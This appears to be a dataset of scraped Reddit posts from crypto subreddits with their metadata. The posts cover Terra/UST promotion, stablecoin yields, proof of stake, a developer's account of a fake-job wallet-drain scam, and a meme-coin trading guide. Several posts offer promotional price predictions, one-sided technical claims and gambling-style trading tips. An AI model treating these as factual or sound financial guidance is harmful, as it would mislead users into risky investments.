swapping stablecoins). binance: with binance listing ust and also offering their own debit card, spending ust should be incredibly easy for anyone with a card. [kado money](https://kado.money/): kado allows you to spend ust directly on many different things, as well as providing a card that can be topped up with ust. [terra cards](https://www.terra.cards/): gift cards using ust (for us based users only) [travala](https://www.travala.com/): pay for flights and hotels using ust! easy as that. they also accepts dozens of other crypto too. **is it too late to get into luna?** no one can predict price movements, but with a long term time horizon, strong assets tend to move up and to the right (just look at a long term chart of any asset you can think of, heck even bitcoin). luna is now trading around ath at 100$, a huge milestone for everyone involved. however, now is not the time to be fomoing in, this is true for any asset at ath's. the listing on binance has been rumored for a while and may prove to be a sell the news event, as luna is already up more than 100% in the past month leading to this listing. of course, i would be more than happy to see luna continue to make aths, but i urge caution and restraint to everyone. dca in if you must. that being said, i believe luna is still undervalued compared to other blockchains. as a ratio of mktcap to tvl, luna is priced lower than almost every notable blockchain in the top 10 besides fantom. and none of the other coins have tokenomics on par with luna, a hyper deflationary token as long as ust adoption increases. again, a bet on terra and luna is a bet on ust and algorithmic decentralized stablecoin winning the stablecoin war. https://preview.redd.it/fvsab5mjsg781.png?width=1856&format=png&auto=webp&s=0ddc56e42274ca0cfe6c39b085b888bacc8b0d67 so for an answer to the question, i would say it's not too late. however, there may very well be better entry opportunities in the short term. stay safe out there all you apes. any questions or comments are welcome! **tldr**: the defi ecosystem on terra is thriving. it has come a long long way since the crash in may. ust is being adopted across blockchains and listed on more and more major exchanges both cex and dex. as ust is minted, luna is burned. more ust = higher value of luna, not financial advice.",126,86,0.95,2021-12-24 04:54:17,web3,defi,AventadorDH,False,119.5
Can providing funds for approved tasks save the billions being lost?,"as an investor, ido and presales are the best time to get into any project that you think will perform well. however it is equally frustrating when you realize that the funds you invested are under the control of the devs because of a whitepaper and their huge promises that made you invest. i do acknowledge that the devs and team needs investor funds to work and achieve their milestones. but do they need it all at once to achieve each milestone or do they need a specific amount of those funds for each step? this is a question that concludes that if the funds are given for particular steps then a huge amount of funding can be saved from the risk of being lost forever. you are a early investor but in no way a fool who would leave their funds to the team so that they can 'utilize' it the way they choose to and you satisfy yourself to move on after a project that failed. projects like [glorypad](https://glorydogecoin.com/#product) completely shift control over the raised funds from the developers to the investors by making it impossible for the developers to use the funds, in any way, without the investors' consent and approval. i think this is a simple and brilliant protocol to protect the billions lost each year by failing projects. investors are also a part of the project and their opinion matters as well. that's what i think but i would like to know your views in this poll about whether this can save the huge amount of funds being lost or not.

Safest / Least Riskiest ways to earn interest on Stablecoins,"hey all - big believer in defi here, and the benefits that it can bring to the traditional finance world. however, i am beginning to be concerned about how volatile the crypto market can be, and how tightly correlated various digital assets can be to each other. it seems that when bitcoin goes down, or up, the entire market follows suit. i have a few crypto projects that i invest in directly by purchasing their coins because i believe in the underlying technology, and the individuals/companies working to build out those eco-systems. but no matter the great things they seem to do, they still seem to be tied to the overall market. even if they announce some awesome news, like a new partnership, a new use-case, or other potentials for greater adoption, the price doesn't seem to move up, unless we are in an overall crypto bull market. what this makes me concerned about with defi - it seems that most of the defi space, specifically lending, is a tangled mess of people taking out loans on their crypto, to invest in more crypto. the most appealing investment strategy for my risk tolerance in defi is investing in stable-coins for the current \~6-9% apr you can get at platforms like blockfi, gemini, celsisus, vouygers, nexo etc. my concern is that at some point, when the market hits these volatile bear market periods, that it could cause a cascading effect, liquidating loans, and putting those firms i listed at risk of default, and therefore loss of my capital. personally, i like using blockfi, gemini, and voyager, because they are us-based companies and afaik follow all of the relevant regulations. blockfi & gemini are both ny based, which has some of the tightest financial regulations. voyager is publicly traded and it's books are open to the public. however, we've seen during the 2008-2009 mortgage crisis that even us based, or public companies, can run into significant troubles during market volatility. i'd be curious how others view this risk, and how they see has the 'safest', least riskiest way, to invest with defi, using stablecoins. is it using one of those platforms i listed? or some other defi protocol, like dai? i haven't looked much into dai or some of the other truly decentralized cryptos for investing in stable-coins. really what i'm looking for is what does everyone perceive as the 'least' riskiest way to take advantage of defi, to earn interest on stablecoins? ideally, usdc. thanks!",83,144,0.99,2021-06-08 12:06:18,web3,defi,eliteparakeet,False,117.30000000000001

Detailed Proof of Stake explanation,"hi everyone, i am a young software developer and i have recently started to delve into the world of blockchain and cryptocurrencies, not for investing but for passion of discovering this technology. i think i have fully understood how proof of work works, in every single aspect. i then turned my attention to proof of stake, which seems to me clearly superior to previous technology in terms of sustainability. from what i understand, the extraction of the block validator is based on a pseudo-random system that everyone can verify and whoever stakes the most currency is more likely to win this lottery. my question now falls on this pseudo-random system: from what i understand there are different types but i do not find in-depth sources that explain them in detail. i was also reading about the problems of ddos attacks that solana's network seems to be having: from what they say it is possible to know in advance who will be the next validator and then attack it. to this, thinking about possible methods to have a pseudo-random extraction system (i repeat that i have not been able to find in-depth sources so it's just my thought), i wonder how it is possible for all the other proof of stake systems not to be subject to the same problem. if anyone could clarify my doubts and attach in-depth sources on proof of stake systems (not general information) i would be very grateful. sorry for my not perfect english.",61,178,0.92,2022-01-15 11:27:26,web3,CryptoTechnology,kish__,False,117.00000000000001

I built my own crypto native savings account. The fact that any developer can do this on the side without asking for permission and with minimal costs is amazing.,"check it out here: https://www.stackup.sh/savers recently i wanted to see if defi could provide a better place to park my cash compared to my traditional savings account earning less than 1%. the requirements i had were: * had to be passive. i wanted something where i could just transfer money in and be completely hands off. * relatively low risk. this means no degen strategies or long exposure to assets other than dai. this also means no insane apy but that’s okay as long as it’s better than my traditional bank rates. * really simple user experience. i know there are other similar products out there. but i wanted to create something that new users coming into defi could also quickly pick up and understand. at the moment, the strategy under the hood is really simple. it’s just using aave and auto compounding all farm tokens at set intervals to optimise my dai apy. i’m sure there are other low risk strategies too (would love to hear them). in future iterations i can incorporate other strategies and this could just be an automated aggregator. i also built this from scratch instead of copy pasting an existing yield farm like we ofter see in this space. the code is all open source and i make sure to maintain high test coverage too. feel free to audit it, use it, and even try to break it if you can! my ultimate goal is to build out a bunch of tools to help people get into defi more easily. next up i’m going to be experimenting with smart contract wallets. if you’re interested, all the code is at https://github.com/stackupfinance/contracts or if you want the latest updates you can sub at https://stackup.substack.com. as a side note, i think it’s amazing that a solo developer can build all kinds of experiences in defi without asking for permission and with minimum costs. in traditional finance, this simple side project which i built in about a month, would have taken 10 times as long with 100 times the initial capital. lowering the barrier to innovation is really bullish for defi.",147,46,0.98,2021-07-14 05:37:09,web3,defi,stackup_,False,116.4
Proof of work vs Proof of stake,since the bitcoin mining power consumption problem has resurfaced it got me thinking. the reason bitcoin mining needs lot of power is its proof of work(pow) algorithm which is very much needed for a trust-less decentralised system. a lot of other cryptos are using proof of stake (pos) approach which does not require all the cryptographic computations of pow hence these cryptos are fast and use less power. however by going to pos did these cryptos compromise on a being a fully trust-less system or is pos legitimately a better substitute for pow without any compromises? is there a case for pow to remain or its just outdated?,105,109,0.97,2021-05-13 09:48:16,web3,CryptoTechnology,chaitanyakakarla,False,116.3

Privacy and anonymity enabled in crypto through Zero-Knowledge Proof technology.,"privacy has become one of the most exciting areas of cryptography research alongside projects building focused on privacy. we’re also witnessing the development of regulatory frameworks that are focused on privacy, such as the american data privacy and protection act and the eu parliamentary recommendations, which may affect the mainstream adoption of cryptocurrency. vitalik buterin, founder of ethereum, made a comment that privacy will become one of the major focus areas in 2023 - this means there’s a big chance that smart contract privacy will continue to expand. the main technology used in privacy is called zero-knowledge proofs, which is quite advanced and arguably better to understand than mixers (which tc uses to obfuscate transaction details). zk-snarks allows for privacy by mathematically preventing information from being revealed while still allowing the protocol to guarantee that transactions execute correctly. zero-knowledge proofs are divided into zk-stark and zk-snarks, which require a non-zero amount of computation; if they are to be implemented on a larger scale, computation could be a limiting factor. there are other privacy-preserving projects, such as aztec protocol which make use of zk-rollups. additionally, starkware industries is using stark technology to improve scalability and privacy on ethereum, while secret network is building secret contracts that will enable computation over encrypted data. railgun is another on-chain privacy protocol built on the ethereum mainnet that uses zero-knowledge proofs (zk-snarks) to obfuscate transaction details and offer users privacy without the need for bridges or mixers. this shines a major light on how robust its security is, considering how bridges have been a major concern due to their susceptibility to hacks and exploitations. however, railgun offers privacy on a layer 1 level without the need for bridges, making it more secure. there’s been a lot of talk about railgun due to its privacy technology and timely development, which has been quite impressive relative to the window period it takes other solutions to attain a peak in their development. it happened to be among the few prifi solutions to launch a private wallet (railway wallet), the world's first evm-compatible zk-snark prover that runs on web, desktop, and mobile platforms. this is a huge advancement in privacy tech, as it greatly increases access to private defi so that privacy can be easily accessed from anywhere. now, the prospective release of the railgun sdk will also offer more privacy solutions when integrated on other crypto dapps or platforms. this all goes without saying that users have become more meticulous about their finances; privacy is gradually becoming a major focus in cryptocurrency. despite the controversy around regulations, as well as privacy and the need for it in defi, there is a need to balance privacy, protection, and transparency. the latter has been proven to be possible through the view-only wallet that is characterized by railgun’s unique key viewing feature, where a key can be generated to share private transactions with another party. this allows a user to cryptographically prove his transaction history for auditing or other purposes if the legitimacy of the users’ funds and activity is questioned. other privacy preserving systems are likely working on this, but i don’t think i’m aware of any other project that has this feature enabled. without a doubt, privacy preserving protocols will continue to present many interesting theoretical and practical opportunities in cryptocurrency. this is exciting to look forward to, considering the propositions that have been made about mainstream adoption over the next couple of years.",147,45,0.98,2022-10-18 08:03:09,web3,CryptoTechnology,Jacobsendy,False,116.0

Cryptocurrency and privacy question,"i’m a reasonable privacy oriented person, i take all those issue somewhat seriously. i’m pretty new to the cryptos. when people in media start describing this technology as a way to sell drugs and firearms without government oversight, i thought “great! i love drugs and firearms.” i’m not. that’s a joke. but i was happy to have a new private option to make transactions. it was a serious let down when i discovered that it was actually the opposite. not only the government can trace every single transaction, but i believe that pretty much anybody can. anyone can create a ledger and with a little bit of know-how they can trace every transaction. also i created a couple of accounts in order to buy and sell cryptos, and each time i had to provide way more information about myself than i was confortable. i heard about monero that is supposedly allow you to keep your transaction private but i feel like there is a catch, otherwise everyone will use it constantly and it feels like it’s not the case today. i don’t know enough to be sure one way or the other so i decided to turn to strangers on the internet to ask their opinion. is there a way to make payment in a private fashion to someone? are there some things that i should keep in mind to raise my privacy level? is creating an anonymous local wallet would be a way to circumvent those issues? but if i do, can i ever convert that money back into fiat without raising red flags? reading all my questions, i realize that it looks like i’m trying to do something illegal. i’m not, i swear. i’m just curious.",117,90,0.96,2021-05-21 05:29:56,web3,CryptoTechnology,inckalt,False,115.8

How to Classify Stablecoins in 2021 :),"in this crypto space, it is all about innovation. one of the key innovations today is the development of stablecoin mechanisms. the types of stablecoin mechanisms today are so varied that 2017's classification is not applicable. today, stablecoin is more than just the classification of on-chain collateral, off-chain collateral and algorithmic stablecoin. in addition, stablecoins have different objectives and reasons for existence. because of these varying objectives, different types of stablecoins were born. many of them have failed and only a few familiar faces remain. in this article, we share how to discuss the stablecoin toolkit to classify stablecoins. # 2017 stablecoin mechanisms in 2017 there was a very brilliant report that classified stablecoins into three kinds of mechanisms. it is not available anymore, but it was a popular article that everyone quoted. ## 1. on-chain stablecoins these are coins like $dai from makerdao where you take and keep on-chain assets like $eth, $usdc, $yfi or $link. then create stablecoins out of it. you take on-chain assets and use them as collaterals to mint $dai. ## 2. off-chain collateral off-chain collateral is where you give your money to someone and get the equivalent amount in crypto. let's say you give a 5 usd note to a company then that company gives you 5 crypto $usd. an example is $usdc which is managed by coinbase — you send usd to coinbase and it gives you crypto usd. every 1 $usdc is backed by 1 usd in the coinbase bank. ## 3. algo stablecoins algo stablecoins can be classified as different kinds of rebasing mechanisms. examples are $ust (terrausd on the $luna network), or amperforth, as well as mechanisms like empty set dollar and dynamic set dollar. $fei is also considered algo stablecoin. we did the recent analysis [here](https://www.notion.so/fei-protocol-362511aaf199456e8aa5f0bdfdd36b84). # 2021 stablecoin mechanism today, we have a better way to classify these mechanisms. shoutout to amani moin, emin gün sirer and kevin sekniqi for their great [research paper.](https://arxiv.org/abs/1910.10098) ## reserves most of these stablecoins are backed by reserves. just like after world war ii when the world economy was recovering, and a lot of currencies were volatile. money was backed by gold and every central bank had gold in the bank. when they printed currency like 1 usd, it was worth that amount of gold in the reserve. this means that the **stablecoin can be redeemed for the underlying reserve**. the reserves then were gold but today it could be a lot of things like on-chain collaterals or off-chain collaterals. it could be like a makerdao where you have a lot of different kinds of currencies like $eth, $yfi or $aave. or it could be off-chain collaterals like gold, us dollars, japanese yen, etc. reserves are used to create mechanisms to determine stablecoins with low volatility. ## dual token when we talk about stablecoins, we are talking about a coin with low volatility or a coin that does not move much. but the truth is that a lot of things actually do still move and there is a lot of volatility in the space. the dual token model has **one token that is stable while the other token absorbs the volatility**. when prices go up or down the secondary token absorbs the volatility. the secondary token could do a lot of other things but the main purpose is to absorb volatility so that it does not impact the stablecoin. ## algo stablecoins an algo stablecoin is about creating a stablecoin **defined by math**. the math changes according to different market changes, to allow the stablecoin to remain at its peg value (e.g., $1). you can change the math if you want (e.g., multi-sig governance) or if the governance votes for it (e.g., dao). algo stablecoins come in many different types. you have a rebasing model, a bond-like model, and a debt-like model. ## mixed a mixed mechanism is a combination of two or a combination of all of the mechanisms; these mechanisms need not exist alone. in stablecoins, one mechanism is not the end and you can mix them up because they serve different kinds of purposes and have a different kind of volatility. you can hedge against volatility in a variety of ways. thus, we have four mechanisms in 2021. read more [here](https://economicsdesign.substack.com/p/ep52-how-to-classify-stablecoins-e0c)",134,60,0.99,2021-06-07 07:57:02,web3,CryptoTechnology,economicsdesign,False,114.3

Solidity Online Scanner,"hello everyone! we have launched a tool called solidity online analyzer, and just released the chrome extension, that allows you to scan a smart contract (in solidity only) code to detect vulnerabilities. it's entirely free to use, and we are working on improving it to make automated code audit quicker and simpler for everyone. you can analyse both already smart contracts (currently supporting 25 chains) or just paste your code directly. we are not storing any of your code or any other data, and all our code is open-source! you can do it both directly on our website, or inside the chrome extension. the extension also add an analyze button in the contract section of any of etherscan's websites, which redirect to our website and launch the analysis directly. you can try it out here: [https://iard.solutions/solidity-analyzer/](https://iard.solutions/solidity-analyzer/) and download the extension here: [solidity analyzer](https://chromewebstore.google.com/detail/solidity-analyzer/hleakkidmmbdoombboadeijdhjpjbpcd) about the way it works, it currently uses slither, along with solc-select, to analyze the provided code. as i said before, we are planning to gradually enhance it by using other tools and providing a more complete analysis of the code, aimed for both developers and common users in order to avoid mistakes or scams. the current output is pretty raw and we will refine it in future updates to be readable by non-technical users. we would love to get feedbacks, so if you have any suggestions, things that you like or dislike about it, please tell us! our goal is to have a comprehensive, free and efficient tool that can be used by about anyone to avoid using/building compromised smart contracts. thanks for reading and looking forward for your feedback! edit: we have also added a print to pdf function if anyone needs to have it in a nice format !",169,6,1.0,2024-05-20 04:27:32,web3,ethdev,Pacdac,False,113.8

Can we have a real debate about the Bitcoin scaling issue?,"i think many of us will agree that a great many crypto subreddits have become completely toxic. the censorship and vitriol that has festered on r/bitcoin is disgusting. and an affront to what the internet, and legitimate debate are supposed to be. and r/btc and bitcointalk are only slightly better in terms of discourse. those that aren't toxic are typically little more than an echo chamber of fan boys. i'd like a real discussion on the biggest problem facing crypto right now, the scaling issues with bitcoin. for better or worse, bitcoin is what is dragging crypto into the main stream (honorable mention to eth). unfortunately, all the noobies entering the space are finding a bitcoin, in the grips of a civil war, that has become completely unusable due to high fees and an ever growing mempool. bitcoin is facing an existential threat in the form of bitcoin cash that didn't exist just 6 short months ago. core developers claim, jihan and roger are evil masterminds behind a massive, unrelenting, coordinated attack to destroy bitcoin. they claim big blocks are to be avoided at all costs as they will centralize power among the miners who are only interested in on chain scaling to protect their own profit margins. under core's watch, bitcoin has ceased to be the world changing tech it once was, and has instead become possibly among the world's most expensive and inconvenient way to exchange value. they claim this is part of the coordinated attack as attackers spam the mempool. in the meantime they've used classic ""move the posts"" techniques such as insisting that bitcoin is a store of value, and was never a currency, and have even suggested things as ridiculous as using ltc to transmit value instead as a work around while we wait for scaling solutions that never come. jihan and roger claim they are preserving satoshi's true vision. gavin andresen agrees. they claim blocks are being kept artificially low to push the network towards tier 2 solutions which would ultimately benefit blockstream. they accuse the several core developers who happened to be employed by blockstream of conflict of interest. they claim lightning network will centralize power among the lightning nodes. they claim core is attempting a hostile takeover of bitcoin. jihan and roger were also among the biggest bitcoin holders in the world. they benefited from the ""free money"" of the fork more than anyone, and have a vested interest worth multi millions if not billions to ensure bitcoin cash exists. but most likely, don't want to see their btc investment fall too 0 either. (roger claims to have dumped all his btc, i don't buy it). it's also true that the updates in core would have eliminated asic boost, possibly one of the biggest factors in making jihan such a powerful figure in the world of btc. they also use shady manipulative tactics to shape public opinion and allegedly have many sock puppet accounts and trolls at their disposal. both arguments have merit. come poke holes in them and let's get to the truth.",115,87,0.97,2017-12-23 03:22:40,web3,CryptoTechnology,rocksolid77,False,113.50000000000001

Beware of This New Solana drain hack,"⚠️ attention crypto community & developers ⚠️ i just got drained on my main wallet. i need to share the story of this scam aimed at developers. i have been in crypto since 2016 and i have always been a relatively cautionary user. new scams are evolving rapidly. i was approached on linkedin for a web3 role as a backend developer. as a passionate junior web developer and crypto enthusiast looking for an initial role, i was very much intrigued. here's how the scam unfolded: • initial contact: the scammer reached out on linkedin and we started discussing a potential role in web3. they seemed credible at first, with a professional profile. • code test requirement: they asked me to do a coding test by adding an api route to their bitbucket repo. this was my first red flag, but my noob junior dev eagerness clouded my judgment. i jumped straight onto coding 🤦🏻‍♂️ • malicious code: i proceeded with the npm install command to be able to console log the server route working as instructed but the repo probably contained malicious npm packages and i did not pay attention then. • fake interview: during what i thought was an interview, they asked me to connect my wallet to a site they were developing. i still knew it could be a scam, so i made him wait while i created a new chrome guest account to create a new metamask wallet from a new seed. thinking in the worse case it would only drain an empty wallet, i used the guest account to proceed and click connect... • theft: within an hour, funds started moving from my main metamask account and other sub-accounts. i immediately jumped on my pc to try to save what was being stolen, but could mainly only save around $2k. • despite my precautions, i lost around $5k, a significant part of my portfolio which i had been building since 2016. 🥲 • the scammer couldn't steal the funds i had staked with @karak_network as it takes 1 week to unstake. i have started the unstaking process today and would like to see if the karak team would be able to do something here. if anyone else knows a way or solution to this problem, i would love to hear them 🙏 • the scammer couldn't neither sell my $cbbtc staked on @solvprotocol as the redemptions are closed, but i fear that he might do it as soon as redemptions are available again. in this sense, would it be possible to do something to secure those funds ? or else, id rather have you blacklist that address so the scammer can never withdraw them neither. i know most of you will probably say that i am stupid, and you wont be too wrong.. i deeply regret how stupid i was and how easily i lowered my guard despite the many red flags my mind refused to pay attention to 🤦🏻‍♂️ ⚠️ red flags • new web3 dex company looking for a junior web dev • contact person making basic english mistakes, despite his supposedly professional profile and background • having to npm install a random bitbucket repo • interviewer not showing his face during the interview • asking me to click connect on his supposedly dev website • weird linkedin username in profile url key lessons & advice: • verify everything: always check the legitimacy of job offers. use tools or professional networks to verify the person's identity. • beware of code tests: never execute code from unknown sources without thorough review, especially if it involves running scripts or installing packages. • secure your wallets: even if using a new wallet for testing, ensure your main accounts are secured on hardware wallet and never disclose sensitive information or connect to unknown sites. • stay vigilant: if something feels off, trust your instincts. scammers are getting better at creating believable scenarios. i'm sharing this story now, because i believe it could happen to anyone and miss-attention can happen very quickly. i know i have been too gullible, and too dumb to think a dev job process happens like this but again my animosity to work as developer got the best of me. i can only have myself to blame for that. i'm not asking for help but would rather hope this message can remind everyone to stay super safe during this upcoming bull, scammers are always lurking in the dark, imagining new creative ways to get your crypto. a retweet would help get @solvprotocol and @karak_network 's attention so they can examine the case and see if they can take actions to secure the funds. finally, if anyone is willing to help look into this case, i'm sharing the transactions that drained my wallet so we can try to have the scammer's address blacklisted: - primary drained wallet address: debank.com/profile/0xea1b… - 2ndary drained wallet address: debank.com/profile/0x0903… - scammer linkedin account: linkedin.com/in/resourcefre… - scammer account 1 (eth): etherscan.io/address/0x7724… - scammer account 2 (ronin) : app.roninchain.com/address/0xba02… - scammer bitbucket malicious repo: bitbucket.org/techreforms/lu… - proprietary safe account 1 (eth): 0x563278be365d7937df813f1d171178aeaec61931 (used to send the funds i could save and salvage during the hack) - proprietary safe accounnt 2 (ronin): 0xa8c182241aa33bd6143cf5be7b0897ef258b0c2d (used to send the funds i could save and salvage during the hack) this experience was a harsh lesson, but my goal in sharing this is to prevent others from falling into similar traps. let's keep the community safe by being cautious and sharing knowledge. if anyone is willing to help spread the word so that everyone can be aware and careful about this type of drain hack, here's the twitter post i wrote yesterday following the hack: https://x.com/getmoustachu/status/1856899025615614365?t=k-jawl0tvmohoknz8kodyq&s=19 stay safe frens, were never too careful and scammers are always lurking in the dark",104,100,0.95,2024-11-14 07:15:36,web3,solana,Delicious-Pack2976,False,111.9

How to buy meme coins in 2024 - a complete guide,"meme coin mania is here. its great to see but i know tons of people are losing a lot of money on rugs. over the past six months, i've immersed myself in the meme coin ecosystem, followed the right influencers on twitter, joined the right telegram groups, made a few of my own coins, and have bought over 10,000 coins i've had some colossal wins like 15000% (150x). i've also been rugged over a 1000 times. here are my top learnings. **platforms/trading options** i've asked all over reddit and twitter about how to trade and have looked for the best trading platforms. but it typically goes like this 1. fund a wallet with sol - i use phantom. 2. find the coin you want to buy and copy the ""coin address"" 3. to buy, use jupiter, movement.market, or telegram to make a swap from sol to the meme coin 4. to sell, use the same platforms. enter your ca and swap for sol if you don't want to go through the hassle of funding a wallet, you can use [https://movement.market/](https://movement.market/) to quickly buy and sell coins with an email and credit card. transactions might not be as fast as a telegram bot, but it's easy to use and you can actually track your portfolio. raydium is just too slow sometimes. jupiter is great for established coins. **strategies** there are three strategies for investing in meme coins: 1. **pure gambling:** this involves betting on extremely new coins launched in the last hour. this is where you might see 100x gains in a few days. 2. **intelligent gambling:** this strategy focuses on somewhat established coins with a community, price history, and some stability (as stable as a meme coin can be). 3. **insider information:** become friends with influencers and devs of coins so you can get in early. help them by offering to run their telegram, make their website, post memes, etc. most people go for the first strategy hoping for a 100x. however, most of these coins fail within the **first few hours**. to win at this you have to invest in a ton of meme coins hoping one gets big and constantly monitor charts. its super time consuming. the second strategy, less degenerate gambling, involves investing in more established coins in the 1m-5m market cap range with the potential to explode to 50-100m. this is a more reliable way to make money without constantly monitoring the charts, fearing a sudden drop to zero. however, investing in all coins within this range isn't wise either. you need to be selective and screen them based on these criteria: * **memeable/funny:** meme need to have comedic appeal to attract attention. * **community/content:** check if the dev team has put effort into their website, are active on twitter, and if people are frequently posting about the coin. a strong community presence is crucial for long-term growth. * **metas/virality potential:** some memes gain popularity due to current events or insider crypto twitter trends (e.g., influencers, cats, 420 coins). while these are often short-lived, some metas (e.g., political themes like jeo boden) can be profitable if you get in early. * **price:** consider the current market cap and potential for growth based on the devs' and community's efforts. if a coin meets your criteria and is significantly undervalued compared to similar coins, it might be a good investment. * **news:** watch the news. tremp coins go up whenever there's news about trump, and new coins are minted all the time. with this strategy you'll see a 10x return, not the 100x that most people hope for, but, 10x is still incredible. the advantage is you can invest larger amounts due to lower risks of scams or sudden wipeouts. the third strategy is the safest but the toughest to break through. you need to find the right people to work with and actually provide value. select devs on and influencers based on this criteria * **experience:** make sure the dev has actually built something before. preferably they're an engineer who works at a legitimate company. * **speed:** see how fast they operate. meme coins can die any minute so they have to be fully committed. * **trustworthiness:** a dev can dump on you (has happened to me) even though you helped him and can ruin all your hard work. * **humor:** are they funny? afterall, these are meme coins. you don't wanna work with someone with a bad sense of humor. **major tip - tweak your twitter :** make sure to prime your twitter feed. create a brand new account and only follow the best influencers. engage with posts that are getting engagement so twitter shoes you more, and follow and like all their content. a better twitter feed will give you the best results to make the most out of your money. **a few rules you should follow** 1. only invest what you can afford to lose 2. avoid buying coins that are sharply dropping 3. set a stop loss and leave if you lose that amount 4. consider the macro market - if bitcoin or solana crash everything crashes 5. trade on trustworthy sites like raydium and jupiter 6. never share your seed phrase with anyone 7. take profits when you can! happy trading!",118,78,0.95,2024-05-31 08:55:24,web3,solana,fireyoutubevids,False,111.5

What are the technical differences between Bitcoin and XRP?,"on october 31st 2008, satoshi nakamoto published a whitepaper on the cryptography mailing list at metzdowd.com describing a digital currency, titled “bitcoin: a peer-to-peer electronic cash system”. on january 3rd 2009, the bitcoin network was created when satoshi mined the starting block of the chain. and the rest is history. litecoin was the second cryptocurrency that was launched in october 2011, and after that came xrp. the underlying technology of xrp, xrp ledger (xrpl), was the second major blockchain system and consensus mechanism that was different from proof of work that bitcoin and litecoin used. the xrpl was launched in june 2012 by three bitcoin developers who saw the potential problems of bitcoin and proof of work and wanted to build something that would not use proof of work and mining to validate transactions. the goal was to create a better bitcoin, with a more sustainable and advanced consensus mechanism. the xrpl uses the federated byzantine agreement (fba) model as its consensus algorithm and it's called xrp ledger consensus protocol. bitcoin's maximum supply is 21 million and xrp's maximum supply is 100 billion. the difference is that all xrp were created in the first day, all are in existence today and no more than the original 100 billion can be created. until bitcoin's supply reaches its maximum, they are created through the mining procedure, each block generates new bitcoins, which are distributed to the miners as rewards. that's how bitcoin's supply is increasing, while xrp works differently. there are no rewards, no more xrp can be minted and it is also deflationary, as every transaction cost is burned/destroyed, which slowly reduces its supply. proof of work (pow) consensus algorithm uses the mining procedure to validate transactions. bitcoin miners act as the network’s transaction validators and verify all the transactions before including them in a block and then adding the latter to the blockchain. by verifying transactions and adding new blocks to the blockchain, miners earn block rewards. this is how new bitcoins are created and are distributed to miners as an incentive to validate transactions and secure the network. on the other hand, the xrp ledger consensus protocol relies on validator nodes, which are basically servers, to record and verify transactions without incentivizing any party. xrpl validator nodes are nodes running as a validating server – meaning they are configured to participate in the consensus process for validating transactions and the governance of the network. validator nodes are different from miners, because they aren’t paid when they order and validate transactions. for consensus to be reached on the network, at least 80% of the validator nodes must agree. this means that there isn't a 51% attack on the xrp network like on bitcoin network. furthermore, on bitcoin network whichever miner finds the blocks, they are unilaterally responsible for which transactions are approved and go into that block, while on the xrp network (xrp ledger) the transactions and changes have to be approved by all the validator nodes (>80% for consensus) and not by a single node, like it happens with miners on bitcoin. this means that the xrp network has a better, more robust and more decentralized structure than bitcoin and ethereum networks. but overall, both networks are decentralized, as they have no central authority and no single party can control their networks. unfortunately, there is a lot of misinformation in the crypto space, especially against xrp, and it's good and recommended for everyone to fact-check everything and do their own research. this article can help you clear up some of the xrp misconceptions: [https://write.as/panos/why-xrp-is-the-most-misunderstood-cryptocurrency](https://write.as/panos/why-xrp-is-the-most-misunderstood-cryptocurrency) on average, one bitcoin block is mined every 10 minutes, but a transaction can take much longer, especially if there is a congestion on the network and high usage. the transaction cost can also vary from few dollars to tens of dollars. on the other hand, the xrp ledger settles transactions in 3 to 5 seconds with a transaction cost of less than a penny (0.0001 xrp on average), and it can process 1500+ transactions per second. another difference is that the xrpl has a built-in decentralized exchange (dex), operating since 2012 and making it the first ever dex. the xrpl has many great features and you can also issue tokens, ious, nfts and use its smart contract features like escrow and checks. bitcoin was designed by satoshi nakamoto to be a p2p digital currency system. his/her/their vision was to use bitcoin for p2p transactions and as an alternative payment system that had no central authority. but after some time, people started to realize that its consensus mechanism, proof of work, has many flaws, which lead to bitcoin becoming slow and expensive for what it was designed for. furthermore, proof of work is not a sustainable system and consumes huge amounts of energy, which makes it non eco-friendly. that's why the xrp creators built xrp and the xrp ledger as a more advanced, scalable and sustainable system that would be closer to the real satoshi's vision, regarding p2p transactions. the underlying technology of xrp uses a unique consensus algorithm, which makes it faster and cheaper to send transactions without having to rely on mining, thus making it more secure, eco-friendly and decentralized. in bitcoin, if someone gains over 51% of the mining power, then they can double spend and reverse transactions. something that is not possible on the xrp ledger, as it works differently, and over 80% of validators must agree for any change to occur. and there is no way to reverse transactions and double spend like you can do on bitcoin network. this is one of the most important problems of bitcoin and proof of work that the xrp creators solved with the xrp ledger consensus protocol. today, many people see bitcoin as a store of value and a hedge against inflation and not as an efficient system for p2p transactions anymore. either way, bitcoin was the first in the market, it started this revolution and it's the reason we are all here today. it opened the way for this technology to show what it can do and allowed for more experiments to be done and better technologies and decentralized consensus mechanisms to be created. there is no reason for tribalism and maximalism. there are countless use cases, markets and problems to be solved by this transformative technology, and each cryptocurrency does its own thing. like bitcoin, xrp, ethereum, all are focusing on different things and use cases. there will not be only one winner. we are in a new internet era. in the end, blockchain is a revolutionary technology and it is transforming the world. cryptocurrencies are the evolution of money and finance, and for the people who are here for the technology and the vision of decentralization, must let hatred and tribalism aside and support each other. some useful links to learn how bitcoin and xrp operate: bitcoin: 1.

"Stop the Solana FUD, read this...","*disclaimer: this post has a tad bit of bias -- however i do my best to make this a fair argument.* # solanas current environment: right now as we all know, solana is having some network congestion issues. the reason for this is obviously the meme-coin craze that's been going on and the spammy transactions coming from trade bots, snipe bots, other bots, etc. this of course is clogging the network. many wonder if solana is even as scalable as it claims to be and to be fair, the people that think that have every right to assume that. however, i am posting here to shine some light on the situation and how even though this is certainly not desirable by many, this is all very good stuff. i'll explain why: # solana's price: solana has been holding the 160-180 price range very well and despite the network issues, it has been holding there pretty damn well if i say so myself. one could argue of course: ""well no one can sell so of course the price doesn't drop!"" sure, maybe to some extent, mainly on dex's. cex, on the other hand, has sol on their books, meaning they can straight up exchange your sol for usdc/usdt/usd using their order books. with that all said, sol has shown some serious promise when it comes to just the price activity of the native token. this means people are building/utilizing sol to deploy programs and trade which all in all is great. # active development: finally, let's get to the juice of this post. many people don't realize solana is actively being worked on, every hour of the day. just by watching the solana tech discord and seeing devs discuss certain ideas/solutions to the congestion issue alone is great. there was a proposition made yesterday by ""zantetsu | shinobi systems"" a solana validator who offered a great solution to the idea in the solana tech discord (full credit goes to him/her) which essentially covered this: there's a general consensus that introducing smart firewall strategies for validators is the way to go. so, here's the breakdown: the idea revolves around enhancing validators and the jito relayer to log certain critical events. one key event is when a transaction (tx) that's well-formed, unique, covers the fee, and the fee payer is adequately funded, is recognized by the validator. it's important that this logging captures the source ip from the quic connection that submitted this transaction, alongside the total fee the transaction would contribute. furthermore, it's crucial to log events when a quic connection is terminated. the next piece of this puzzle is a separate program dedicated to scrutinizing these logs. this program would monitor the lifespan of quic connections, evaluating whether they 